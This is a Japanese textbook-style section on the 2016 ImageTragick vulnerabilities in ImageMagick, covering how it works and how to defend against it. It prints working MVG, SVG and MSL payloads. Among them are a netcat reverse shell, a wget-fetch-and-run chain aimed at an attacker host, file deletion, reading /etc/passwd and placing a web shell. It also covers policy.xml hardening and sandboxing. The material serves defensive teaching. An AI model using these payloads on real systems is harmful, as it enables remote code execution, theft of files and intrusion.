## ImageTragick（CVE-2016-3714）の全体像

ファイルアップロード機能を持つWebアプリケーションのきわめて多くが、裏側で **ImageMagick**（画像の変換・リサイズ・サムネイル生成を行う定番ライブラリ／コマンド群）を呼び出している。2016年5月に公開された **ImageTragick** は、その ImageMagick に潜んでいた一連の脆弱性群であり、「攻撃者が用意した画像ファイルをサーバに処理させるだけでリモートコード実行（RCE）に至る」という、アップロード機能にとって最悪級の結果をもたらした。本節では、なぜ「ただの画像処理」がコマンド実行に化けるのか、その仕組みをパーサと外部プロセス呼び出しの内部挙動レベルで解き明かし、防御の要点を整理する。

> 本節は防御・検知を目的とした解説である。掲載するペイロードは「どのような入力が危険か」を理解し、自分が管理するシステムを守るための最小限の例であり、実在サービスや本番環境への無許可の検証・破壊的操作に用いてはならない。

### なぜ「画像処理」がコマンド実行になるのか — delegate（デリゲート）機構

ImageMagick は膨大な数の画像・ドキュメント形式に対応するが、そのすべてを自前で実装しているわけではない。一部の形式は **delegate（デリゲート＝処理の外部委譲）** という仕組みで、`wget`・`curl`・`gs`（Ghostscript）といった **外部の実行ファイルを呼び出して** 処理を肩代わりさせている。どの形式でどの外部コマンドを呼ぶかは `delegates.xml` という設定ファイルにテンプレートとして定義されている。

問題は、この外部コマンドの呼び出しが **シェル経由の `system()` 呼び出し**（OSにコマンド文字列をそのまま渡して解釈・実行させる関数）で行われ、しかもテンプレートに埋め込むパラメータ（画像のURIやファイル名）を **シェルのメタ文字（`;` `|` `"` `` ` `` `$()` など、シェルにとって特別な意味を持つ記号）を除去せずにそのまま連結** していた点にある。

代表的な、HTTPS画像を取得するデリゲートのテンプレートは次のようなものだ（版により `wget` 版と `curl` 版がある）。

```
"wget" -q -O "%o" "https:%M"
```

```
"curl" -s -k -L -o "%o" "https:%M"
```

ここで `%o` は出力先のテンポラリファイル名、**`%M` は攻撃者が制御できる「取得対象のURI」** に置換される（`%M` = 入力が最終的にシェルコマンド文字列へ流し込まれる sink、すなわち入力が最終的に実行・解釈される危険な代入先）。ImageMagick は `%M` の中身をチェックせずにテンプレートへ埋め込むため、URIの中にダブルクォートとパイプを仕込むと、意図された `wget`/`curl` コマンドを途中で閉じて、その後ろに任意のコマンドを継ぎ足せてしまう。

```
convert 'https://example.com";|ls "-la' out.png
```

このとき、実際にシェルへ渡る文字列は概念的に次のように展開される。

```
"wget" -q -O "out.png" "https:https://example.com";|ls "-la"
```

`"https:...example.com"` で本来のコマンドが `;` により終了し、続く `|ls "-la"` が **別コマンドとして実行** される。攻撃者は `ls` の部分を `curl`／`nc`／`bash` などに差し替えることで、サーバ上で任意のコマンドを走らせられる。これが CVE-2016-3714 の本質であり、公開当時「90年代を彷彿とさせる、恥ずかしいほど単純なシェルコマンドインジェクション」と評された理由でもある。

> 出典: ImageTragick 公式 — https://imagetragick.com/
> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick

### アップロード防御を無力化する2つの鍵 — 拡張子ではなく「中身」で判定される

ファイルアップロードの防御では「拡張子を `.jpg` `.png` に限定する」対策がよく取られるが、ImageTragick に対してこれは **ほとんど無力** である。理由は2つある。

1. **ImageMagick は拡張子ではなく「ファイルの中身（マジックバイト／内部の記述）」で形式を判別する。** したがって、攻撃コードを記述した MVG／MSL／SVG ファイルを `shell.jpg` という名前で保存しても、ImageMagick は中身を見て「これは MVG だ」と解釈し、危険な処理経路に入ってしまう。拡張子ホワイトリストをすり抜ける。
2. **`convert` だけでなく `identify`（画像の情報を表示するだけに見えるコマンド）も脆弱。** 「変換していないから安全」とは言えず、`lesspipe.sh` のようにファイルを介して間接的に `identify` を呼ぶツール経由でも発火し得る。

このため、後述するように「中身レベルでの検証」と「危険なコーダ／プロトコルの無効化」が必須になる。

> 出典: ImageTragick 公式 — https://imagetragick.com/

### 攻撃の運搬形式 — MVG・MSL・SVG

`%M` へメタ文字を届けるための「運び屋」となるのが、ImageMagick が解釈する記述系フォーマットである。

#### MVG（Magick Vector Graphics）

MVG は ImageMagick 独自の **ベクター画像記述言語**（描画命令をテキストで書く小さなDSL）。`fill 'url(...)'` のように **URLを指定できる命令** があり、この URL がデリゲート経由で取得される際に前述の `%M` に流れ込む。攻撃コードを埋め込んだ最小の MVG は次の形になる。

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/spl017.jpg"|ls "-la)'
pop graphic-context
```

`url(...)` の中で、本来のURLをダブルクォートで閉じ、`|ls "-la` を継ぎ足している。取得（wget/curl）は失敗するが、パイプ以降の `ls -la` がシェルで実行される。ここを次のように差し替えれば、より実害のある動作になる（いずれも防御理解のための例）。

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -e "/bin/sh" "127.0.0.1" "443)'
pop graphic-context
```

#### SVG（経由でMVGに変換される）

攻撃者はより「普通の画像」に見える **SVG** を入口にできる。ImageMagick は SVG を内部で MVG 相当の処理に落とし込むため、`<image xlink:href="...">` の URL 部分に同じ細工を施せる。XML なのでダブルクォートは `&quot;`、`>` `&` は `&gt;` `&amp;` とエンティティ化して埋め込む。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

#### MSL（Magick Scripting Language）

MSL は XML で画像操作の手順を書くスクリプト言語。`<read>` と `<write>` を組み合わせることで、後述のファイル移動（CVE-2016-3716）に悪用される。

> 出典: BreakPoint Labs「ImageMagick Undocumented Feature – RCE」 — https://breakpoint-labs.com/imagemagick-undocumented-feature-rce-cve-2016-3714/
> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/

### RCEは「ブラインド」であることが多い — 攻撃者側の進め方から防御を考える

実運用のWebアプリでは、コマンドの標準出力が攻撃者に返らない **ブラインドRCE** になることが多い。攻撃者は次のように段階的に確度を上げていく（＝防御側は「外向き通信」と「一時ファイルの生成・実行」を監視すればこの兆候を捉えられる、という裏返しの知見でもある）。

1. **実行確認（アウトオブバンド）**: まず `"/bin/ping -c 2 <attacker-ip>"` のような、結果が出力に出なくても攻撃者側のネットワークで観測できるコマンドで発火を確認する。パス依存を避けるため `ping` ではなく `/bin/ping` とフルパス指定する。
2. **ペイロードの投下**: `fill 'url(https://fake-site.com/1.png"|/usr/bin/wget "http://attacker-ip:port/shell.py" -O /tmp/shell.py")'` で外部からスクリプトを取得。
3. **実行権限付与**: `fill 'url(https://fake-site.com/1.png"|chmod "a+x" /tmp/shell.py")'`。
4. **実行**: `fill 'url(https://fake-site.com/1.png"|python /tmp/shell.py")'`。

この流れは、防御側にとって「アップロード処理サーバからの想定外のアウトバウンド接続」「`/tmp` への書き込みと即時実行」という具体的な検知ポイントを与える。

> 出典: BreakPoint Labs「ImageMagick Undocumented Feature – RCE」 — https://breakpoint-labs.com/imagemagick-undocumented-feature-rce-cve-2016-3714/

### 兄弟CVE — RCE以外の被害クラス（CVE-2016-3715〜3718）

ImageTragick は CVE-2016-3714 の RCE だけではない。デリゲートやコーダ（各形式を読み書きする内部モジュール）の擬似プロトコルを悪用した、別種の被害を生む脆弱性が同時に公開された。RCE をコーダ無効化で塞いでも、これらが残ると危険なので、防御は「危険コーダ／プロトコルの一括無効化」で包括的に行う必要がある。

- **CVE-2016-3714 — RCE**: 前述のシェルコマンドインジェクション。
- **CVE-2016-3715 — 任意ファイル削除**: `ephemeral:` 擬似プロトコル（「読み終えたら消す」一時ファイル用スキーム）を悪用し、指定したファイルを削除させる。

  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
  pop graphic-context
  ```

- **CVE-2016-3716 — 任意ファイル移動／設置**: `msl:` 擬似プロトコルで外部のMSLスクリプトを読み込ませ、`<read>`/`<write>` により任意パスへファイルを移動・設置する。既存の無害な画像をWebルート配下に `.php` として書き出せば、Webシェル設置に直結し得る。

  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'msl:/tmp/msl.txt'
  pop graphic-context
  ```

  参照される `/tmp/msl.txt`（読み込んだGIFを別パスへ書き出す）:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="/tmp/image.gif" />
  <write filename="/var/www/shell.php" />
  </image>
  ```

- **CVE-2016-3717 — ローカルファイル読み取り**: `label:@` 擬似プロトコルは、指定したファイルの中身を「ラベル文字列」として出力画像に描画してしまう。これにより `/etc/passwd` などの内容が **生成画像の中に可視化** され、機密ファイルが漏洩する。

  ```mvg
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'label:@/etc/passwd'
  pop graphic-context
  ```

- **CVE-2016-3718 — SSRF（サーバサイドリクエストフォージェリ）**: `url:`／`mvg:` などを通じて ImageMagick に **任意のURLへHTTP(S)リクエストを送信** させられる。RCE に至らずとも、内部ネットワークやクラウドのメタデータエンドポイントへの到達手段として悪用され得る。

> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/
> 出典: ImageTragick 公式 — https://imagetragick.com/

### 根本原因の三重奏

ImageTragick が成立してしまった根本原因は、独立した3つの弱点が重なった点に整理できる。防御はこの3点それぞれに対応させると漏れがない。

1. **入力形式の検証欠如**: マジックバイト（ファイル先頭の形式識別バイト列）を確認せず、中身の記述だけで危険な形式（MVG/MSL）として解釈してしまう。
2. **デフォルトポリシーが緩い**: 初期状態の `policy.xml` が、危険なコーダ／デリゲートの起動を制限していない。
3. **メタ文字の未フィルタ**: デリゲート実装が入力バッファをシェルメタ文字ごと `system()` へ直接渡していた。

> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/

### 対象バージョンと修正状況（陳腐化に注意）

- **影響を受ける版**: 2016年5月公開時点の ImageMagick 6系・7系の広範な版（例: 6.9.3-7 [2016-04-27]、6.8.6-10 [2016-04-29]、および両ブランチの当時最新ソース）。
- **不完全な初期修正**: **6.9.3-9（2016年4月30日リリース）は修正が不完全で、バイパス可能だった。** バージョン番号だけを見て「対策済み」と判断するのは危険で、後続の完全修正版へ更新する必要があった。
- **現在（本教科書は2016年公開の脆弱性を扱う）**: 現行の ImageMagick はデリゲートのメタ文字処理が修正され、かつ後述の強化された `policy.xml` が配布されている。ただしレガシー環境・古いコンテナイメージ・古い言語バインディング同梱版が残っていることがあるため、「使っている ImageMagick の版とポリシー」を必ず確認すること。

> 出典: ImageTragick 公式 — https://imagetragick.com/
> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick

### 防御 — 何をどう塞ぐか

#### 1. policy.xml で危険なコーダ／デリゲート／パスを無効化する（最重要）

もっとも効果的かつ即時に打てる対策は、`/etc/ImageMagick/policy.xml`（版により `/etc/ImageMagick-6/policy.xml` 等）の `<policymap>` 内で、悪用される擬似プロトコル・形式・`@`によるファイル読込を **明示的に禁止（`rights="none"`）** することである。Red Hat が案内した設定例:

```xml
<policymap>
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="FTP" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />
  <policy domain="path" rights="none" pattern="@\*" />
</policymap>
```

各行の意味を押さえておく。`EPHEMERAL`/`HTTPS`/`HTTP`/`URL`/`FTP` は外部取得・ファイル削除に使われるプロトコルコーダ、`MVG`/`MSL` は攻撃コードの運搬形式、`LABEL`/`TEXT` はファイル内容の読込・描画に悪用される形式、最後の `domain="path" pattern="@\*"` は **`@ファイル名` 記法によるローカルファイル読込を全面禁止** する。SSRF を確実に塞ぐには `HTTP`/`HTTPS`/`URL`/`FTP` を含めることが重要。

> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick
> 出典: ImageTragick 公式 — https://imagetragick.com/

#### 2. マジックバイト（先頭シグネチャ）を検証する

ImageMagick に渡す前に、アプリケーション側で **ファイル先頭バイトが期待する形式のシグネチャと一致するか** を確認し、一致しなければ拒否する。拡張子や Content-Type ではなく中身で判定するのがポイント。

- GIF: 先頭バイトが `47 49 46 38`（`GIF8`）
- JPEG: 先頭バイトが `FF D8`

これにより、MVG/MSL/SVG を画像拡張子で偽装したファイルを入口で弾ける。

> 出典: ImageTragick 公式 — https://imagetragick.com/

#### 3. 入力形式を明示的に固定する

`convert` に対して、入力・出力の形式を **プレフィックスで明示** すると、中身に基づく自動判別を封じられる。

```
convert jpg:input.jpg jpg:output.jpg
```

こうすると `input.jpg` の中身が実は MVG であっても「JPEGとして読め」と強制されるため、危険な形式解釈への迂回を防げる。

#### 4. 多層防御 — サンドボックス・モジュール無効化・代替ライブラリ

- **プロセス隔離**: `seccomp-bpf`（システムコールを制限するLinuxの仕組み）やコンテナ／低権限ユーザで ImageMagick を隔離し、万一のRCEでも被害範囲を限定する。
- **モジュール無効化（RHEL 5 など古い環境の回避策）**: `policy.xml` が使えない古い版では、コーダの共有ライブラリ自体を退避してロードさせない。例: `/usr/lib/ImageMagick-*/modules-Q16/coders/` 配下の `mvg.so` `msl.so` `label.so` をリネーム（`mv mvg.so mvg.so.bak` など）。
- **代替の検討**: 単純な画像デコード用途であれば、汎用の巨大ライブラリより `libpng`・`libjpeg-turbo` のような目的特化ライブラリのほうが攻撃面が小さい場合がある。

> 出典: Red Hat「ImageTragick - CVE-2016-3714」 — https://access.redhat.com/security/vulnerabilities/ImageTragick
> 出典: Benny Simmonds「Technical Analysis of ImageTragick」 — https://www.bencode.io/posts/2019-09-27-imagetragick/

### まとめ — アップロード機能の設計原則として

ImageTragick が教える最大の教訓は、**「アップロードされたファイルは、単に保存されるデータではなく、下流のパーサやツールに対する『命令』になり得る」** ということである。画像処理という一見無害な工程が、外部コマンド実行・ファイル読み書き・SSRF の入口になった。第8章のテーマ「アップロードからRCE/その他への昇格」の典型例であり、防御の原則は次の3つに集約される。

1. **入口で中身を検証する**（マジックバイト・形式固定）。拡張子を信用しない。
2. **処理系の危険機能を最小権限に絞る**（`policy.xml` によるコーダ／プロトコル／パスの無効化）。
3. **万一の実行を封じ込める**（サンドボックス・低権限・アウトバウンド監視）。

これらは ImageMagick に限らず、Ghostscript・LibreOffice・ffmpeg など「アップロードファイルを解釈する外部処理系」全般に共通する、アップロード機能の恒久的な設計原則である。
